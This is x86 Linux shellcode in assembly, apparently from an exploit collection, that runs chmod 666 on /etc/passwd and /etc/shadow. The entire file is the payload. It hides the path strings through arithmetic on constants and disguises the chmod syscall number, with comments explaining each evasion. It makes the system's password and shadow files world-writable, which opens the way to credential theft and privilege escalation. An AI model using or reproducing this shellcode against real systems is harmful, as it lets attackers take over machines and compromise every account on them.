; Title:	Linux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes

global _start

section .text

_start:

	xor eax, eax
	mov cx, 0x1b6 ; 0666 octal
	push eax
	
;	push 0x64777373 ; sswd
	mov ebx,0x86999595
        sub ebx,0x22222222
	push ebx

	push 0x61702f2f ; //pa

;	push 0x6374652f ; /etc
	mov ebx,0x85968751
        sub ebx,0x22222222
	push ebx

	mov  ebx, esp
	mov  al,0x4 ; make it look like were using stdout for the syscall
	add  al,0xb ; then add 11 to it, to make it 15 (chmod)
	int  0x80

	xor eax, eax
	push eax

;	push 0x776f6461
	mov ebx,0x99918683
        sub ebx,0x22222222
        push ebx

	push 0x68732f2f	

;	push 0x6374652f
	mov ebx,0x85968751
        sub ebx,0x22222222
        push ebx


	mov ebx, esp
	mov al, 0x4
	add al, 0xb
	int 128 ; the object dump will convert this back to 0x80

; 	seg fault here to save space, 
;	because the chmod's will still run
;	xor eax, eax
;	inc eax
;	int 0x80
